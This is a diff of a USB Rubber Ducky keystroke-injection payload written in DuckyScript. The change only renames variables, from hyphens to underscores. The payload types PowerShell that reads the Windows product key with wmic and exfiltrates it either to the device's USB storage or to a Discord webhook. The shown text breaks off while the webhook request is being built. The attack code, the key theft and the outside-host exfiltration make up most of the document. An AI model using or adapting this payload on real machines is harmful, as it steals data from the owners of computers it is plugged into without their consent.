@@ -11,14 +11,14 @@ REM_BLOCK
 END_REM
 
 REM Put here your Discord Webhook, i.e. https://discord.com/api/webhooks/0123456789.../abcefg...
-DEFINE #DISCORD-WEBHOOK example.com
+DEFINE #DISCORD_WEBHOOK example.com
 
 REM_BLOCK
 How would you prefer to do the exfiltration?
 Via Discord Webhooks or via Rubber Ducky USB storage?
-If you prefer to use the storage offered by USB Rubber Ducky, set the boolean variable #USB-RUBBER-DUCKY-STORAGE to TRUE, otherwise set it to FALSE and the alternative mode will be automatically selected, so via Discord Webhook.
+If you prefer to use the storage offered by USB Rubber Ducky, set the boolean variable #USB_RUBBER_DUCKY_STORAGE to TRUE, otherwise set it to FALSE and the alternative mode will be automatically selected, so via Discord Webhook.
 END_REM
-DEFINE #USB-RUBBER-DUCKY-STORAGE TRUE
+DEFINE #USB_RUBBER_DUCKY_STORAGE TRUE
 
 
 EXTENSION DETECT_READY
@@ -57,15 +57,15 @@ DELAY 2000
 
 STRINGLN $key_detected=$(wmic path softwarelicensingservice get OA3xOriginalProductKey)+$(wmic path softwarelicensingservice get OA3xOriginalProductKeyDescription);
 
-IF_DEFINED_TRUE #USB-RUBBER-DUCKY-STORAGE
+IF_DEFINED_TRUE #USB_RUBBER_DUCKY_STORAGE
     STRINGLN
         $m=(Get-Volume -FileSystemLabel 'DUCK').DriveLetter;
         echo $key_detected >> ${m}:\exfiltration.txt
     END_STRINGLN
 END_IF_DEFINED
-IF_NOT_DEFINED_TRUE #USB-RUBBER-DUCKY-STORAGE
+IF_NOT_DEFINED_TRUE #USB_RUBBER_DUCKY_STORAGE
     STRINGLN
-        $hookUrl = "#DISCORD-WEBHOOK"
+        $hookUrl = "#DISCORD_WEBHOOK"
         $exfiltration = @"$key_detected"@
         $payload = [PSCustomObject]@{
             content = $exfiltration
